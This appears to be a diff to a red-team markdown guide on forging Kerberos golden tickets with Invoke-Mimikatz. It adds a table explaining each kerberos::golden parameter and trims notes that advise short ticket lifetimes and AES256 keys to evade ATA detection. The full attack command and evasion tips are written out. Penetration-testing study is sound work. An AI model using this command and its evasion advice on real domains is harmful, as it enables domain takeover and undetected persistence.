@@ -25,6 +25,18 @@ After that we need to create the ticket.
 
 * **Invoke-Mimikatz**
 
+|               **Parameter**              |                                                              **Description**                                                              |
+|:----------------------------------------:|:-----------------------------------------------------------------------------------------------------------------------------------------:|
+| /user:Administrator                      | Username fot which TGT is generated                                                                                                       |
+| /domain:corp.local                       | Domain FQDN                                                                                                                               |
+| S-1-5-21-268341927-4156873456-1784235843 | Domain SID                                                                                                                                |
+| /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d | NTLM(RC4) hash of the krbtgt account. Use /aes128 and /aes256 for AES keys.                                                               |
+| /id:500                                  | User RID (default 500)                                                                                                                    |
+| /groups:513                              | Group ID (default 512,513,518,519,520)                                                                                                    |
+| /startoffset:0                           | Optional - When the ticket is available (Default 0 - right now, -10 - Available since 10minutes ago)                                      |
+| /endind:600                              | Optional - The default AD setting is about 10 hours (10h * 60min = 600).                                                                  |
+| /renewmax:10080                          | Optional - Mimikatz by default create a ticket lifetime with 10 years of renewal. Default AD setting is 7 days (7d * 24h * 60min = 10080) |
+
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 
@@ -36,9 +48,9 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.loc
 
 > **RedTeam Note**: Avoid detection by creating a ticket with less duration than the maximum in kerberos policy. So create a ticket and inmediately use it.
 >
-> `/endin:600` Mimikatz by default create a ticket with 10 years of lifetime. The default AD setting is about 10 hours (10h * 60min = 600).
+> `/endin:600` Mimikatz by default create a ticket with 10 years of lifetime.
 >
-> `/renewmax:10080` Mimikatz by default create a ticket lifetime with 10 years of renewal. Default AD setting is 7 days (7d * 24h * 60min = 10080)
+> `/renewmax:10080` Mimikatz by default create a ticket lifetime with 10 years of renewal.
 
 > **RedTeam Note**: To prevent beeing detected of ATA use the `aes256` keys.
 
